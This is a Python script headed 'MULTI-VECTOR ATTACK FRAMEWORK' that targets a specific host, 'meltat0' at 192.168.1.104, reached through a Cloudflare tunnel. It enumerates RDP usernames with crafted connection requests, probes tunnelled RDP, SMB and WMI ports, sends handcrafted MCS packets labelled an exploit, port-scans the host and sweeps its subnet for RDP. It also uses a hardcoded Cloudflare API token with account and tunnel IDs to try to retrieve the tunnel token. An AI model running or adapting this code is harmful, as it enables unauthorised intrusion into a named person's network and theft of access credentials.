import socket
import struct
import ssl
import threading
import time
import subprocess
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

CF_TOKEN = "ySIb_2uMzHQDvnK5MulcCvOiRKsC6k0pH188bG8Y"
ACCOUNT_ID = "4c2932bc3381be38d5266241b16be092"
TUNNEL_ID = "926eac5e-2642-4a16-9edc-c06b6c705ab8"

results = []

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}")
    results.append(msg)

def vector_rdp_brute(users, port=3390):
    log("[VECTOR 1] RDP user enumeration...")
    valid_users = []
    for user in users:
        try:
            cookie = f"Cookie: mstshash={user}\r\n".encode()
            neg_req = bytes([0x01, 0x00, 0x08, 0x00, 0x03, 0x00, 0x00, 0x00])
            x224_data = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg_req
            cr = bytes([0x03, 0x00]) + struct.pack(">H", 4 + 1 + len(x224_data)) + bytes([len(x224_data)]) + x224_data
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect(("localhost", port))
            sock.sendall(cr)
            resp = sock.recv(1024)
            if resp[5] == 0xd0:
                log(f"    [+] User '{user}' accepted by RDP")
                valid_users.append(user)
            sock.close()
        except Exception as e:
            pass
    return valid_users

def vector_warp_port_scan(target_ip, ports):
    log(f"[VECTOR 2] WARP port scan on {target_ip}...")
    open_ports = []
    
    def check(port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            if sock.connect_ex((target_ip, port)) == 0:
                return port
            sock.close()
        except:
            pass
        return None
    
    with ThreadPoolExecutor(max_workers=50) as ex:
        futures = {ex.submit(check, p): p for p in ports}
        for f in as_completed(futures):
            r = f.result()
            if r:
                log(f"    [+] Port {r} OPEN on {target_ip}")
                open_ports.append(r)
    return open_ports

def vector_tunnel_service_probe():
    log("[VECTOR 3] Probing tunnel services...")
    services = {}
    endpoints = [
        ("rdp.ai-smith.net", 3390, "tcp"),
        ("smb.ai-smith.net", 44445, "tcp"),
        ("wmi.ai-smith.net", 10135, "tcp"),
    ]
    
    for hostname, local_port, proto in endpoints:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex(("localhost", local_port))
            if result == 0:
                sock.send(b"\x00\x00\x00\x01")
                try:
                    data = sock.recv(1024)
                    services[hostname] = f"ACTIVE ({len(data)}b)" if data else "OPEN"
                except:
                    services[hostname] = "OPEN (no response)"
            else:
                services[hostname] = "CLOSED"
            sock.close()
        except Exception as e:
            services[hostname] = f"ERROR: {e}"
    
    for h, s in services.items():
        log(f"    {h}: {s}")
    return services

def vector_rdp_channel_exploit(port=3390):
    log("[VECTOR 4] RDP virtual channel probe...")
    try:
        cookie = b"Cookie: mstshash=exploit\r\n"
        neg_req = bytes([0x01, 0x00, 0x08, 0x00, 0x0b, 0x00, 0x00, 0x00])
        x224_data = bytes([0xe0, 0x00, 0x00, 0x00, 0x00, 0x00]) + cookie + neg_req
        cr = bytes([0x03, 0x00]) + struct.pack(">H", 4 + 1 + len(x224_data)) + bytes([len(x224_data)]) + x224_data
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        sock.connect(("localhost", port))
        sock.sendall(cr)
        resp = sock.recv(1024)
        
        if resp[5] == 0xd0:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssl_sock = ctx.wrap_socket(sock, server_hostname="localhost")
            
            mcs_connect = bytes([
                0x03, 0x00, 0x01, 0xca,
                0x02, 0xf0, 0x80,
                0x7f, 0x65, 0x82, 0x01, 0xbe,
            ])
            
            ssl_sock.send(mcs_connect)
            mcs_resp = ssl_sock.recv(4096)
            log(f"    [+] MCS response: {len(mcs_resp)} bytes")
            log(f"    [+] First 32 bytes: {mcs_resp[:32].hex() if mcs_resp else 'empty'}")
            ssl_sock.close()
            return True
    except Exception as e:
        log(f"    [-] Channel exploit failed: {e}")
    return False

def vector_subnet_discovery():
    log("[VECTOR 5] Subnet device discovery via WARP...")
    found = []
    
    def ping_host(ip):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.5)
            if sock.connect_ex((ip, 3389)) == 0:
                return ip
            sock.close()
        except:
            pass
        return None
    
    ips = [f"192.168.1.{i}" for i in range(1, 255)]
    
    with ThreadPoolExecutor(max_workers=100) as ex:
        futures = {ex.submit(ping_host, ip): ip for ip in ips}
        for f in as_completed(futures):
            r = f.result()
            if r:
                log(f"    [+] Found RDP on {r}")
                found.append(r)
    
    return found

def vector_cloudflare_api_enum():
    log("[VECTOR 6] Cloudflare tunnel enumeration...")
    import urllib.request
    import json
    
    headers = {"Authorization": f"Bearer {CF_TOKEN}", "Content-Type": "application/json"}
    
    endpoints = [
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/connections",
        f"https://api.cloudflare.com/client/v4/accounts/{ACCOUNT_ID}/cfd_tunnel/{TUNNEL_ID}/token",
    ]
    
    for url in endpoints:
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = json.loads(resp.read())
                if data.get("success"):
                    log(f"    [+] {url.split('/')[-1]}: Got data")
                    if "token" in url and data.get("result"):
                        log(f"    [!] TUNNEL TOKEN: {data['result'][:50]}...")
        except Exception as e:
            log(f"    [-] {url.split('/')[-1]}: {e}")

def main():
    log("=" * 60)
    log("MULTI-VECTOR ATTACK FRAMEWORK")
    log("Target: meltat0 (192.168.1.104) via Cloudflare Tunnel")
    log("=" * 60)
    
    users = ["melody", "mikeb", "admin", "administrator", "user", "guest", "meltat0"]
    vector_rdp_brute(users)
    
    vector_tunnel_service_probe()
    
    vector_rdp_channel_exploit()
    
    vector_cloudflare_api_enum()
    
    high_value_ports = [22, 23, 80, 135, 139, 443, 445, 3389, 5900, 5985, 5986, 8080, 8443]
    vector_warp_port_scan("192.168.1.104", high_value_ports)
    
    vector_subnet_discovery()
    
    log("")
    log("=" * 60)
    log("ATTACK SUMMARY")
    log("=" * 60)

if __name__ == "__main__":
    main()
